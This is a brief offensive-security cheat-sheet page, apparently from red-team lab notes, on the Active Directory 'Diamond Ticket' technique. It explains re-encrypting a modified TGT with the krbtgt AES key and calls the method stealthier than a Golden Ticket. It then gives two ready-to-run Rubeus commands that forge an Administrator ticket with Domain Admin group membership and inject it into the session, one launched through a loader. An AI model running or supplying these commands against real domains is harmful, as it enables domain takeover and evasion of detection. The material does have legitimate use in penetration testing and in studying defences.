# Diamond Ticket

A diamond ticket is created by decrypting a valid TGT, making changes to it and re-encrypt it using the AES keys of the krbtgt account which makes it less detectable. Diamond Ticket is more about repackaging than forging. It’s a lot more OpSec safe than Golden Ticket.

## Repackage the Ticket

<pre class="language-batch" data-overflow="wrap"><code class="lang-batch"><strong># With user password
</strong><strong>Rubeus.exe diamond /domain:DOMAIN /user:USER /password:PASSWORD /dc:DOMAIN_CONTROLLER /enctype:AES256 /krbkey:HASH /ticketuser:USERNAME /ticketuserid:USER_ID /groups:GROUP_IDS /show /ptt
</strong><strong>
</strong><strong># With domain users
</strong>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /enctype:AES256 /krbkey:&#x3C;aes_hash> /ticketuser:Administrator /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt /tgtdeleg
</code></pre>

